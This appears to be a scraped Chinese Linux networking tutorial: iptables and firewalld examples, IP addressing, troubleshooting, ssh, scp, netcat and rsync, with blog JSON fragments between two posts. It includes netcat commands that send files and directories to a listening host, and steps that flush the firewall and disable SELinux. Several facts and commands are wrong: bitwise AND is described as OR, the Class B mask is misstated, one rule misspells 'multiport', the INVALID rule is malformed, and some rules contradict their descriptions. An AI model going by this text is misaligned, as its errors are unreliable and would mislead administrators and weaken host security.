ACCEPTiptables -A OUTPUT -p icmp -j ACCEPT 然后在把默认策略修改为drop, 12iptables -P INPUT DROP INPUT链默认策略改为DROP，改回来把DROP换成ACCEPT就行了iptables -P OUTPUT DROP OUTPUT链默认策略改为DROP 例5，实现允许ssh过来（代表本机为服务器身份），ssh出去（代表本机为客户端身份），别的任何访问都拒绝 （要求,INPUT和OUTPUT双链默认策略都为DROP）。设置策略后，本机无法作为ssh客户端访问出去。 tcp/22 三次握手，数据传输，四次挥手 （tcp/ip) －－－－－－－－－－－－－》 client server &lt;－－－－－－－－－－－－－ 192.168.224.11 192.168.224.10 OUTPUT INPUT 客户端 随机端口 －－－》 服务器 22 (1024-65535) 客户端 随机端口 《－－－ 服务器 22 INPUT OUTPUT 服务器端防火墙 12345iptables -Fiptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPTiptables -P INPUT DROPiptables -P OUTPUT DROP 客户端防火墙 12345iptables -Fiptables -P INPUT DROPiptables -P OUTPUT DROPiptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPT 执行上面的语句后，本地就无法连接自己了。执行下面的命令，可以实现本地访问 123456iptables -A INPUT -i lo -j ACCEPTiptables -A OUTPUT -o lo -j ACCEPT参数解释： -i 表示Input进接口，进入的请求 -o 表示Output出接口，出去的请求 lo 表示localhost，也就是本机自己连接自己，localhost对应的IP是127.0.0.1 结论： 在设置白名单运行22号端口通讯后，那么本机作为ssh服务器可以正常提供ssh服务，但是在本机应用了上面的规则以后，本机无法作为SSH客户端去连接出去，因为SSH客户端使用1024-65535的端口范围去连接远程SSH服务器。 练习：只允许特定的IP访问本地的80端口，其他的主机发来的请求忽略。 答案:和上面做法一样，把22换成80就ok了 =================================== 例子：如果要让本机作为客户端访问SSH，那么需要允许1024-65535端口进来。 这样可以允许本地在双链默认拒绝的情况下，同时提供SSH服务以及作为SSH客户端来使用。在server执行 1234567iptables -Fiptables -P INPUT DROPiptables -P OUTPUT DROPiptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPTiptables -A INPUT -p tcp --dport 1024:65535 -j ACCEPTiptables -A OUTPUT -p tcp --sport 1024:65535 -j ACCEPT 验证： server可以作为SSH客户端连接远程。 ============================================================================== 例子： 如何查询出本机用哪个端口来连接远程的ssh服务 12345yum install -y net-tools 下载软件netstat netstat -ntp | grep 192.168.224.10 tcp 0 0 192.168.224.12:33228 192.168.224.10:22 ESTABLISHED 4506/ssh 参数解释： -n 端口使用数字来表示，例如SSH端口使用数字22。 -p 显示进行PID -l 显示监听状态的连接 -t 显示TCP连接 -u 显示udp连接 按照上面的查询结果，本机使用60864来连接远程端口。 lsof -i:33228[root@client2 ~]# lsof -i:33228COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEssh 4506 root 3u IPv4 38908 0t0 TCP client2.example.com:33228-&gt;server.example.com:ssh (ESTABLISHED)lsof命令显示本机33228端口，被ssh客户端占用 由上一条命令查询得知33228端口，被进程4506进程使用。 使用ps命令，查询此端口被哪个应用所占用。 12345ps -ef|grep 4506root 4506 4420 0 23:20 pts/0 00:00:00 ssh 192.168.224.10root 5287 3055 0 23:24 pts/1 00:00:00 grep --color=auto 4506[root@client2 ~]# 2.iptables 常用模块1ls /usr/lib64/xtables/ #这里面全是iptables的模块。 multiport模块连续端口或多端口写法 123iptables -A INPUT -p tcp --dport 1:1000 -j ACCEPTiptables -A INPUT -p tcp -m multiport --dport 25,110 -j ACCEPTiptables -A INPUT -p tcp -m multiport --dport 22,28,44:66,80:90 -j ACCEPT 例子：按照MAC硬件地址进行访问控制 123456iptables -Fiptables -P INPUT DROPiptables -P OUTPUT ACCEPTiptables -A INPUT -m mac --mac-source 00:0c:29:4e:51:b0 -p all -j ACCEPT 例子: ftp实现双链拒绝的情况下，客户端通过主动和被动都能访问进来 准备 （在服务器端和客户端都要清空防火墙规则，最好使用新的规则）:清空iptables规则 12345678910iptables -P INPUT ACCEPTiptables -P OUTPUT ACCEPTiptables -Fiptables -F -t nat iptables -F -t mangleiptables -F -t raw yum install vsftpd -ysystemctl restart vsftpd 客户端下载ftp 1yum install -y ftp 客户端测试方法:1,命令连接测试，能成功连接上就表示命令端口连接没问题 ftp 192.168.224.10 (服务器的ip,账号密码就是服务器端已有的用户的)2,数据传输测试，用上面的命令登录成功后，在客户端使用passive指令转换你的主动和被动模式，(服务器端不用转换，因为服务器端默认就是主动和被动都支持的)然后使用ls指令能看到目录就表示数据传输OK了（因为默认是登录到服务器的用户HOME目录) 1234567 vim /etc/vsftpd/vsftpd.conf --直接在配置文件最后加上这两句就可以pasv_min_port=3000pasv_max_port=3005systemctl restart vsftpdiptables -P INPUT DROPiptables -P OUTPUT DROP 设置双链拒绝后，客户端无法访问FTP ftp 192.168.224.10 ftp有主动和被动的连接两种1，为什么有主动和被动两种连接方式呢?因为这是一种比较古老的设计方式，它是假设客户端用户有防火墙并且还不会配置防火墙的情况下，才设计出两种模式。防火墙默认只会拒绝进来的包，而不会拒绝出去或出去回来的包。2,一般用主动好还是被动好?用被动比较常见，（原因参考问题一）3，主动和被动在使用时的区别?没有防火墙，那么使用起来没什么区别，只是底层传输包的方式不一样有防火墙，那么防火墙的规则写法也不一样 例子一：FTP主动模式 #客户端用随机端口访问server21端口，20端口处理后返回随机端口主动： server client 20 21 n m &lt;------------- --------------&gt; ----------------------------------------&gt; &lt;--------------------------------------- 在服务器端执行： 123456iptables -P INPUT DROPiptables -P OUTPUT DROPiptables -A INPUT -p tcp --dport 21 -j ACCEPTiptables -A INPUT -p tcp --dport 20 -j ACCEPTiptables -A OUTPUT -p tcp --sport 21 -j ACCEPTiptables -A OUTPUT -p tcp --sport 20 -j ACCEPT 在客户端执行：ftp 192.168.224.10ftp&gt; ls (可以正常运行)ftp&gt; passive （切换为被动模式）ftp&gt; ls (出现问题，无法正常运行) Note： passive on –此命令用来切换主动模式。然后执行ls就可以了。但是被动模式不行。 例子二：FTP被动模式 #客户端用随机端口访问server21端口，3000-3005端口处理后返回client随机端口。被动： server client 随机端口 21 n m 3000－3005 &lt;————— —————-&gt; &lt;-------------------------------------------- ---------------------------------------------&gt; 123456789101112iptables -Fiptables -F -t nat iptables -F -t mangleiptables -F -t rawiptables -A INPUT -p tcp --dport 21 -j ACCEPTiptables -A INPUT -p tcp --dport 20 -j ACCEPTiptables -A OUTPUT -p tcp --sport 20 -j ACCEPTiptables -A OUTPUT -p tcp --sport 21 -j ACCEPTiptables -A INPUT -p tcp --dport 3000:3005 -j ACCEPTiptables -A OUTPUT -p tcp --sport 3000:3005 -j ACCEPT 合到一起，两条直接搞定 12iptables -A INPUT -p tcp -m multiport --dport 20,21,3000:3005 -j ACCEPTiptables -A OUTPUT -p tcp -m multiport --sport 20,21,3000:3005 -j ACCEPT iprange模块以ip范围进行过滤 如： 来自192.168.224.8到224.15ip的网络流量都允许通过。 1iptables -t filter -A FORWARD -m iprange --src-range 192.168.224.8-192.168.224.15 -o ens33 -j ACCEPT string模块以关键字来进行网络流量过滤 只要是经过的流量有baidu关机字的都丢掉。 1iptables -t filter -A FORWARD -s 192.168.224.0/24 -o ens33 -m string --string baidu --algo kmp -j DROP 参数 1234string match options:--algo Algorithm 算法--icase Ignore case (default: 0) 忽略大小写[!] --string string Match a string in a packet 字符串匹配数据包中的字符串 time模块以时间段来过滤 周一到周五早上10点到下午6点经过ens33网卡的流量都丢掉。 1iptables -t filter -A FORWARD -s 192.168.224.0/24 -m time --timestart 00:00 --timestop 10:00 --weekdays 1,2,3,4,5 -o ens33 -j DROP connlimit模块用于限制同一IP可建立的连接数目 –connlimit-upto n –connlimit-above n 同一时刻只能有3台ip建立ssh连接。 1iptables -I INPUT -d 192.168.224.12 -p tcp --syn --dport 22 -m connlimit --connlimit-above 2 -j REJECT state模块包过滤的条件:如:-p 协议-sport/dport xxx-s/-d xxxx-m state –state 状态 如果按照tcp/ip来划分连接状态，有11种之多(课后可以自己去读一下相关知识)但iptables里只有4种状态；ESTABLISHED、NEW、RELATED及INVALID 这两个分类是两个不相干的定义。例如在TCP/IP标准描述下UDP及ICMP数据包是没有连接状态的，但在state模块的描述下，任何数据包都有连接状态。 1、ESTABLISHED（已建立） (1)与TCP数据包的关系：首先在防火墙主机上执行SSH Client，并且对网络上的SSH服务器提出服务请求，而这时送出的第一个数据包就是服务请求的数据包，如果这个数据包能够成功的穿越防火墙，那么接下来SSH Server与SSH Client之间的所有SSH数据包的状态都会是ESTABLISHED。 (2)与UDP数据包的关系：假设我们在防火墙主机上用firefox应用程序来浏览网页（通过域名方式），而浏览网页的动作需要DNS服务器的帮助才能完成，因此firefox会送出一个UDP数据包给DNS Server，以请求名称解析服务，如果这个数据包能够成功的穿越防火墙，那么接下来DNS Server与firefox之间的所有数据包的状态都会是ESTABLISHED。 (3)与ICMP数据包的关系：假设我们在防火墙主机ping指令来检测网络上的其他主机时，ping指令所送出的第一个ICMP数据包如果能够成功的穿越防火墙，那么接下来刚才ping的那个主机与防火墙主机之间的所有ICMP数据包的状态都会是ESTABLISHED。 由以上的解释可知，只要第一个数据包能够成功的穿越防火墙，那么之后的所有数据包（包含反向的所有数据包）状态都会是ESTABLISHED。 2、NEW（新建立） 首先我们知道，NEW与协议无关，其所指的是每一条连接中的第一个数据包，假如我们使用SSH client连接SSH server时，这条连接中的第一个数据包的状态就是NEW。 3、RELATED（相关的） RELATED状态的数据包是指被动产生的数据包。而且这个连接是不属于现在任何连接的。RELATED状态的数据包与协议无关，只要回应回来的数据包是因为本机送出一个数据包导致另一个连接的产生，而这一条新连接上的所有数据包都是属于RELATED状态的数据包。 4、INVALID INVALID状态是指状态不明的数据包，也就是不属于以上三种状态的封包。凡是属于INVALID状态的数据包都视为恶意的数据包，因此所有INVALID状态的数据包都应丢弃掉，匹配INVALID状态的数据包的方法如下： iptables -A INPUT -p all -m state INVALID -j DROP 我们应将INVALID状态的数据包放在第一条。 | 随机 | 80 web －－－－－－－－－ －》 client | server 《－－－－－－－－－－－ 随机 | 80 | client访问server过去第一个数据包（new状态），如果拒绝，那么后续包都会被拒绝（因为后面来的都会是第一个，都为new状态)第一个数据包如果允许过去，那么后续包的状态为established server返回给client返回的所有包都为established 例1：有下面两台机 192.168.224.11 192.168.224.10 client server 192.168.224.11是可以ssh访问192.168.224.10，也可以curl访问192.168.224.10 0，在Server上安装HTTPD服务，并启动 1，在192.168.224.10上iptables -Fiptables -F -t natiptables -P INPUT DROPiptables -P OUTPUT DROP这里就把双链都关掉，192.168.224.11任何访问都过不来了 2，按以前的做法在192.168.224.10上允许别人ssh进来 123456iptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPT在192.168.224.10上允许别人curl进来iptables -A INPUT -p tcp --dport 80 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPT 或者把上面四条合下面两条 12iptables -A INPUT -p tcp -m multiport --dport 22,80 -j ACCEPTiptables -A OUTPUT -p tcp -m multiport --sport 22,80 -j ACCEPT 注意：如果要想server 也能 ssh 客户端需要加上下面两条： 12iptables -A INPUT -p tcp -m multiport --sport 22,80 -j ACCEPTiptables -A OUTPUT -p tcp -m multiport --dport 22,80 -j ACCEPT 下面两段等同于，上面所有语句的效果。在Server上设置防火墙规则： 12iptables -A INPUT -p tcp -m multiport --dport 22,80 -j ACCEPTiptables -A OUTPUT -p tcp -m state --state established -j ACCEPT (后面一句可以翻译成tcp协议的连接只要你进得来，你就回得去）(无论他是用哪个随机端口访问进来的;因为只要能进来，那么后续的包都属于ESTABLISHED状态) 验证：在client1 访问 curl 192.168.224.10 可以正常访问 =============================================================例2： 在默认INPUT DROP的防火墙规则下，如何保证由本机发出的请求正常使用 192.168.224.11 client 需求：client1为客户机器，要保证安全，所以INPUT默认为DROP，但是同时要保证由本机发出的请求正常使用。 在client1设置如下防火墙规则： 123456iptables -Fiptables -F -t NATiptables -P INPUT DROPiptables -P OUTPUT ACCEPTiptables -A INPUT -p all -m state --state established -j ACCEPT 验证：1.client1，ssh到其他机器可以正常使用。 2.从server ping client1.结果为失败。 例2:有些服务器，可能希望客户端ping不通此服务器，但是此服务器可以ping通客户端(前提是客户端没有防火墙限制) 方法一:修改系统配置在服务器上把/proc/sys/net/ipv4/icmp_echo_ignore_all的值改为1临时修改两种方式: 12345vim /proc/sys/net/ipv4/icmp_echo_ignore_allecho 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_allor sysctl -w net.ipv4.icmp_echo_ignore_all=1 sysctl -p 永久修改 123 vim /etc/sysctl.conf --加上下面一句net.ipv4.icmp_echo_ignore_all = 1 sysctl -p --使用此命令让其生效 方法二:通过iptables的状态来实现有下面两台机 192.168.224.11 192.168.224.10 实现192.168.224.10这个IP能ping通所有人.但所有人不能ping通192.168.224.10 | --------------》| -------&gt; client | server 192.168.224.11 | 192.168.224.10 &lt;-------------| &lt;-------- NEW ESTABLISHED INPUT 拒绝 允许 OUTPUT 允许 允许 1，在192.168.224.10上iptables -P INPUT DROPiptables -P OUTPUT DROP这里就把双链都关掉，192.168.224.11任何访问都过不来了 2,在192.168.224.10上 12iptables -A INPUT -p icmp -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p icmp -m state --state NEW,ESTABLISHED -j ACCEPT #NEW 小写也可以 –重点是INPUT那条不能允许NEW状态的;–注意第二步的第二条(也就是output这条)，如果只写了NEW状态，那么192.168.224.10ping所有人，都只能通第一个包；加上ESTABLISHED状态，所有包都能通 ====================================================================练习：有一个服务器，搭建了http,ftp(主动和被动都要支持,被动端口为3000-3005）两个服务（需要开放给所有人访问)，还要开放ssh和ping（但只开放给一个管理ip访问，比如此IP为192.168.224.11)，其它任何进来的访问都拒绝但此服务器要出去访问别的任何服务，自己的防火墙都要允许 准备干净的虚拟机 1234567891011yum install vsftpd -yvim /etc/vsftpd/vsftpd.conf --直接在配置文件最后加上这两句就可以pasv_min_port=3000pasv_max_port=3005systemctl restart vsftpdsystemctl enable vsftpdyum -y install httpdsystemctl restart httpdsystemctl enable httpd 需求:一个一个的写 12345678910111213141516171819202122iptables -P INPUT DROPiptables -P OUTPUT DROPiptables -A INPUT -p tcp --dport 80 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPTiptables -A INPUT -p tcp --dport 21 -j ACCEPTiptables -A OUTPUT -p tcp --sport 21 -j ACCEPTiptables -A OUTPUT -p tcp --sport 20 -j ACCEPTiptables -A INPUT -p tcp --dport 20 -j ACCEPTiptables -A INPUT -p tcp --dport 3000:3005 -j ACCEPTiptables -A OUTPUT -p tcp --sport 3000:3005 -j ACCEPT iptables -A INPUT -p tcp --dport 22 -s 192.168.224.11 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -d 192.168.224.11 -j ACCEPTiptables -A INPUT -p icmp -s 192.168.224.11 -j ACCEPTiptables -A OUTPUT -p icmp -d 192.168.224.11 -j ACCEPTiptables -A OUTPUT -p all -m state --state new,established,related -j ACCEPTiptables -A INPUT -p all -m state --state established,related -j ACCEPT 需求综合起来写 12345678iptables -P INPUT DROPiptables -P OUTPUT DROPiptables -A INPUT -p tcp -m mutliport --dport 80,21,20,3000:3005 -j ACCEPTiptables -A INPUT -p tcp --dport 22 -s 192.168.224.11 -j ACCEPTiptables -A INPUT -p icmp -s 192.168.224.11 -j ACCEPTiptables -A OUTPUT -p all -m state --state new,established,related -j ACCEPTiptables -A INPUT -p all -m state --state established,related -j ACCEPT 验证：1.从client1访问 curl 192.168.224.10。结果正常2.测试ftp主动/被动模式。从client1访问ftp 192.168.224.10ftp&gt; lsftp&gt; passive （切换模式）ftp&gt; ls ==== 结束实验。清空iptables规则。最好重新准备干净的虚拟机继续做下面的实验。 123456789iptables -P INPUT ACCEPTiptables -P OUTPUT ACCEPTiptables -Fiptables -F -t nat iptables -F -t mangleiptables -F -t rawsystemctl restart iptablessystemctl stop iptablessystemctl disable iptables =============================================================端口转发 12vim /etc/sysctl.conf --加上下面一句net.ipv4.ip_forward=1 sysctl -p 使之生效环境：Server 外网IP 192.168.2.73 内网IP 192.168.224.10 Client3 IP 192.168.224.13 在Client3安装HTTP 在Server，设置入站规则：将来访问80端口的流量做DNAT，将目标地址改为192.168.224.13 1iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.224.13 在Server，设置出站规则，将从端口80发出的流量做SNAT，将源地址修改为192.168.224.10 1iptables -t nat -A POSTROUTING -p tcp --dport 80 -j SNAT --to-source 192.168.224.10 验证： 在物理机访问http://192.168.2.73和http://192.168.224.10 可以显示client3上的web网页。 2.在server本机访问192.168.224.10以及192.168.2.73均无法访问。 2.firewalldrhel7和centos7的新防火墙软件 firewalld （但仍然可以使用iptables) Linux网络防火墙对比 iptables• iptables在rhel7之前是非常流行的，但是它对于firewalld来讲过于低级， 而且它自身只能编写IPV4的规则，IPV6则需要其他的程序实例来帮助完成。• firewalld• firewalld是rhel7引入的权限的netfilter子系统交互程序，确切的说它是一 个服务。并且它将网络划分为多个区域来进行管理。 官网地址 1http://www.firewalld.org/ 开始试验：准备干净的虚拟机 12345yum install firewalld firewall-config -ysystemctl restart firewalld systemctl status firewalld systemctl enable firewalld 概念一 ZONE:Zone 简单来说就是防火墙方案,就是一套规则集，你可以切换使用哪一个zone firewall-cmd –get-zones –查看现在有哪些zoneblock dmz drop external home internal public trusted work drop：拒绝所有外部连接请求。block：拒绝所有外部连接(with an icmp-host-prohibited message for IPv4 and icmp6-adm-prohibited for IPv6)，允许内部发起的连接public：适用公共环境，拒绝所有外部连接请求，但指定外部连接可以进入external：特别适用路由器启用了伪装功能的外部网。拒绝所有外部连接请求，只能接收经过选择的连接。dmz：用于您的非军事区内的电脑，此区域内可公开访问，可以有限地进入您的内部网络，仅仅接收经过选择的连接。（受限制的公共连接可以进入）work：适用于工作网络环境，概念和workgoup一样，也是指定的外部连接允许用于工作区。home：类似家庭组,用于家庭网络。您可以基本信任网络内的其他计算机不会危害您的计算机。仅仅接收经过选择的连接internal：用于内部网络。您可以基本上信任网络内的其他计算机不会威胁您的计算机。仅仅接受经过选择的连接trusted：可接受所有的网络连接。（最不安全） firewall-cmd –get-default-zone –查看当前使用的zonepublic firewall-cmd –set-default-zone=workfirewall-cmd –set-default-zone=public –修改当前使用的zone firewall-cmd –list-all –查看当前使用的zone的规则集firewall-cmd –zone=work –list-all –指定查看work这个zone的规则集 vim /etc/firewalld/zones/public.xml”。firewall的默认模式”public”的配置文件，如下图所示，可以看到添加的服务都在里面，如果在其中按照格式添加”ftp”，重新加载后就添加了这个服务了。 cd /usr/lib/firewalld/services/进入这个目录后，如下图所示，输入”ls”，就可以看到可以添加哪些服务，并且可以看到这些服务的名称了。 概念二:网卡接口 123firewall-cmd --zone=public --add-interface=eth0 --指定网卡加入到哪个zonefirewall-cmd --get-zone-of-interface=eth0 --查看网卡加入到哪个zone 常用命令：firewall‐cmd ‐‐reload //重新载入防火墙策略，未设置为永久策略的规则会丢失。firewall‐cmd ‐‐permanent //永久策略属性firewall‐cmd ‐‐add‐ //添加一条策略 ‐‐add‐source=source[/mask] ‐‐add‐service=httpfirewall‐cmd ‐‐remove‐ //删除一条策略firewall-cmd –list-all 查询已有防火墙规则 概念三:服务于端口 123456789port,service 分别表示端口和服务firewall-cmd --add-port=80/tcp --允许tcp的80端口进来的通迅（类似iptables的INPUT)firewall-cmd --remove-port=80/tcp --删除上面的规则firewall-cmd --add-service=http --允许http服务进来的通迅（不用管它是什么端口，只记住服务就好了)firewall-cmd --remove-service=httpfirewall-cmd --add-service=ftp --允许ftp服务进来的通迅（无论主动还是被动都可以，这样就把iptables的写法简单化了)firewall-cmd --remove-service=ftp 概念四:富规则rich-rule复杂规则（富规则）富规则中可以包含很多网络元素，比如:IP地址、端口、以及处理动作、记录日志等操作。我们可以使用富规则来精确控制我们的访问流量，而不是粗放的。 12firewall-cmd --add-rich-rule=&quot;rule family='ipv4' source address=192.168.224.11 service name='ssh' accept&quot; 下面两条合起来实现允许所有人访问我的http,但drop掉192.168.224.11的访问我的http的包 123firewall-cmd --add-service=http firewall-cmd --add-rich-rule=&quot;rule family=&quot;ipv4&quot; source address=192.168.224.11 service name=&quot;http&quot; drop&quot;firewall-cmd --list-rich-rule （查询现有的富规则） 概念五:关于立即生效与永久生效 立即生效：上面的练习都是立刻生效，但是无法永久保存，重新防火墙服务，重启机器，以及执行–realod参数都会导致规则被覆盖。 永久生效： 在命令行中加入参数 –permanent 为永久保存，但是运行时不会立即生效，需要执行 firewall –reload命令才会让规则立刻生效。 firewall-cmd –permanent –add-service=ftp –加了一个–permanent参数后，立即不生效，需要reload后才能生效实际写规则时，建议直接写（不加–permanent参数)，所有规则写完，测试完成后，再使用firewall-cmd –runtime-to-permanent 全部转成permanent规则 概念六:panic模式,在遭受攻击的时候进入紧急模式，以保护服务器。 12firewall-cmd --panic-onfirewall-cmd --panic-off 概念七:图形配置 1firewall-config =======================================================================================","link":"/2020/08/04/iptables/"},{"title":"linux_IP网络","text":"IP分类(IPV4/IPV6)(不必记住)32位的二进制数字, IP地址由网络地址和主机地址组合 特殊的IP地址: 32位全为0的IP地址, 代表本机本身 32位全为1的IP地址, 代表全网广播地址 10 172 192开头的地址为内网IP(局域网地址) 127开头的地址代表回环地址， 代表本机本身， 用于测试使用 A 前8位为网络地址， 后24位为主机地址 首位固定为0, 范围:1-127 00000000.00000000.00000000.00000001 － 01111111.11111111.11111111.11111111 0.0.0.1 － 127.255.255.255 B 前16位为网络地址，后16位为主机地址, 2的7次方128开始 开头两位固定为10, 范围128-191 10000000.00000000.00000000.00000000 － 10111111.11111111.11111111.11111111 128.0.0.0 － 191.255.255.255 默认子网掩码:255.255.255.0 C 前24位为网络地址，后8位为主机地址, 2的7次方 + 2的6次方 192开始 开头两位固定为110, 范围192-223 11000000.00000000.00000000.00000000 － 11011111.11111111.11111111.11111111 192.0.0.0 － 223.255.255.255 默认子网掩码:255.255.255.0 D 组播地址, 用于视频会议, 2的7次方 + 2的6次方 + 2的5次方 224开始 11100000.00000000.00000000.00000000 － 11101111.11111111.11111111.11111111 224.0.0.0 － 239.255.255.255 E 军方使用和预留, 2的7次方 + 2的6次方 + 2的5次方 + 2的4次方 240开始 11110000.00000000.00000000.00000000 － 11110111.11111111.11111111.11111111 240.0.0.0 － 247.255.255.255 特殊的网络地址 0.0.0.0 &lt;—- 代表全世界所有的地址 127.0.0.1 - 127.255.255.255 &lt;—- 本地环回地址，测试本机tcp/ip是否正常 –某些集群软件也会使用环回地址(lvs集群的DR（direct routing)架构会使用环回地址) 记住三个私网IP段A类: 10.0.0.0 - 10.255.255.255 B类: 172.16.0.0 - 172.31.255.255 C类: 192.168.0.0 - 192.168.255.255 网络通信的类型 点对点，平常大多数的网络行为都是点对点，比如发邮件，从http下载文件，从DNS服务器获取域名解析 组播（点对多点），集群 广播（点对多点），dhcp获取地址，ARP (Address resolution protocol) 子网掩码是如何影响对网络号的确定。(PPP1) 192.168.224.11/24 55 - 32 = 23 11000000.10101000.00000000.10110111 IP 11111111.11111111.11111111.00000000 掩码 11111111.11111111.11111111.10110111 二进制的与运算, 只有位值都为0时才取0，否则取1 子网掩码把一个IP地址分成两部分，左边是网络部分，右边是主机部分 网络号 ：10.1.1.0 (主机部分的二进制位全部为0） 广播地址：10.1.1.255 (主机部分的二进制位全部为1） 可用的IP地址数量：主机部分除开网络号和广播地址，剩下的IP都是可用IP ---&gt; 网络号相同就是同一个网段，同一个网段的节点在默认配置下可以直接通信 &lt;--- 两个节点能通信的条件 物理上连通（线缆符合规格，交换机加电） 有正确的路由，也就是知道到达目的地的路 有通信的权限（防火墙） 网络故障排查1. 检查网线 a. 查看物理网口的黄灯是否闪烁 不闪烁， 检查物理网线是否正常 b. 闪烁 操作的网卡 sudo mii-tool 网卡设备名(PPP2) 显示link ok代表网卡连接情况正常 这里的正常是网卡能正常使用， 并不是可以正常上网 2. 查看右上角的网络连接状态， 查看有线网络是否有连接 3. 查看当前使用的网卡是否是停用状态 ip a s 查看enp0s25后面的信息，查看mtu 1500 qdisc pfifo_fast state 后面的字母是UP还是DOWN 如果是DOWN， 执行命令: sudo ip l set enp0s25 up 停用网卡： sudo ip l set enp0s25 down 4. 查看当前使用的网卡是否有ip ip a s 如果没有的话就可以临时获取ip 删除当前的ip sudo ip a del 192.168.0.*/24 dev enp0s25 添加一个临时ip sudo ip a add 192.168.0.*/24 dev enp0s25 ip的获取方式是动态的时候, 随机获取一个动态ip sudo dhclient enp0s25 或者点右上角, 断开再连接 或者重新插拔网线 也可以设置永久 在设置之前先把防火墙和selinux关闭 sudo iptables -F &lt;-- 清空放火墙的规则 sudo setenforce 0 &lt;-- 暂时关闭selinux getenforce &lt;-- 查看selinux的状态 Permissive/disable 表示已经关闭 永久设置selinux sudo vim /etc/selinux/config SELINUX=disable &lt;-- 修改这个值 123456789101112131415161718sudo vim /etc/sysconfig/network-scripts/ifcfg-enp2s0 DEVICE=&quot;enp0s25&quot; &lt;-- 网卡名字BOOTPROTO=static &lt;-- 使用固定IPNM_CONTROLLED=no &lt;-- 不受networkmanager控制ONBOOT=yes &lt;-- 自动启动TYPE=EthernetIPADDR=192.168.0.200 &lt;-- IP 地址NETMASK=255.255.255.0 &lt;-- 子网掩码GATEWAY=192.168.0.1 &lt;-- 默认网关DNS1=223.5.5.5 &lt;-- DNS1 服务器DNS2=192.168.0.1 &lt;-- DNS2 服务器 sudo systemctl restart network &lt;-- 重启网卡 sudo systemctl status network &lt;-- 查看network的服务状态sudo systemctl stop network &lt;-- 停止network的服务sudo systemctl start network &lt;-- 启动network的服务 5. 检查网关(路由器)连接情况 使用ping命令检查网关连接情况 ping -c 1 192.168.0.1 外网IP ping不通, 先检查路由表, 再检查网关的配置 查看路由表 route -n 查看UG标识行里有没有网关IP 网关ping不通, 检查本机到网关的线路问题及网关 sudo ip r add default via 192.168.0.1 &lt;-- 添加默认路由 sudo ip r del default &lt;-- 删除默认路由 6. 检查DNS解析情况 ping -c 3 www.baidu.com 域名ping不通, 外网IP能ping通, DNS设置问题 设置DNS: sudo vim /etc/resolv.conf 添加以下内容:(顶行) nameserver 223.5.5.5 只有前三个DNS能起作用 # vi /etc/sysconfig/network NETWORKING=yes 如果这里设置为no，那么本机的网络将可能不可用,网络服务不能中场重启 上互联网的三要素：IP, Gateway, DNS/etc/resolv.conf &lt;– 域名服务器信息会记录在这个文件中 hosts文件(本地DNS缓存) 格式: IP地址 域名 主机名(局域网使用)(PPP3) 查看主机名 hostname 1. 修改主机名 /etc/hostname 临时修改主机名 hostname 主机名 永久修改主机名 hostnamectl set-hostname 主机名 或者 hostnamectl set-hostname --static look.com 2. 修改主机名一定要修改/etc/hosts文件, 将回环地址与主机名对应关系 不修改/etc/hosts，会出现图形界面启动速度慢 ssh, 安全的链接方式，可用于远程登录，传输文件，创建加密隧道等1. 普通远程登录 ssh username@ip(PPP4)(1)ssh 的证书登录方式的配置(PPP8) 客户端创建一组密码钥匙 ssh-keygen -t rsa -b 4096 -rw——- 1 root root 3239 May 9 14:35 id_rsa &lt;– 私钥 -rw-r–r– 1 root root 736 May 9 14:35 id_rsa.pub &lt;– 公钥 (2) 把客户端所创建的公钥id_rsa.pub传给服务器(3) 服务器把客户端的公钥添加到文件$HOME/.ssh/authorized_keys 中，具体如下：假设想允许客户端以用户u9的身份登录到服务端，那么就把公钥放到/home/u9/.ssh/authorized_keys 里面。如果想允许客户端以用户root的身份登录到服务端，那么就把公钥放到/root/.ssh/authorized_keys 里面。 2. 远程登录并允许运行远程机上的图形软件ssh -X username@hostnamessh -Y username@hostnamevncviewr 3. scp(PPP5) 远程传输文件传输bash文件 到 192.168.224.12服务器下的/tmp/目录下，并命名newbashscp /bin/bash root@192.168.224.12:/tmp/newbash scp root@192.168.224.12:/some/where/file /local/dir/file 远程复制文件夹scp -r root@192.168.0.182:/some/where/dirname /local/dir/file 4. 把一个字符串传输到远程，并在远程存储为文件 echo &quot;hello &quot; | ssh user@host.com &quot;cat &gt; /somewhere/file&quot; 5. 修改远程机的帐号密码 必须登录对方的root账户才可以去修改， 可以试下uplooking用户的结果 echo &quot;123&quot; | ssh root@192.168.0.1 &quot;passwd --stdin u1&quot; nc 远程传输命令(PPP6)yum install -y nc telnet nmap 网络点对点聊天 服务端: (谁先运行谁是服务端) nc -l 本机的IP地址 端口号 端口号建议的取值范围: 1024 ~ 65535 例: nc -l 192.168.224.11 8000 客户端: nc 服务器IP 服务器设置的端口号 例: nc 192.168.224.11 8000 例二： A机器 nc -l 8000 B机器 telnet 192.168.224.11 8000 在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口 telnet 192.168.224.11 8000 Trying 192.168.224.11... Connected to 192.168.224.11. Escape character is '^]'. ​​ 1. 文件传输 A作为服务器, A发给B A: Server(假设服务器的ip为192.168.224.11) nc -l 192.168.224.11 8000 &lt; file.txt B: Client nc 192.168.224.11 8000 &lt; file.txt 2. 目录传输 A: Server tar -cvzf – dir_name1 di_rname2 | nc -l 192.168.224.11 8000 B: Client nc 192.168.224.11 8000 | tar -xvzf - rsync1. rsync是什么 它是一个远程数据同步工具，它在同步文件的同时，可通过LAN/WAN快速同步多台主机间的文件。 Rsync使用所谓的“rsync算法”来使本地和远程两个主机之间的文件达到同步， 这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。 可以保持原来文件的权限、时间、软硬链接等附加信息。 2. 配置文件 rsync的主要有以下三个配置文件，后面两个文件默认不存在，请手动创建它。 /etc/rsyncd.conf(主配置文件) /etc/rsyncd.secrets(密码文件) /etc/rsyncd.motd(rsync服务器信息) 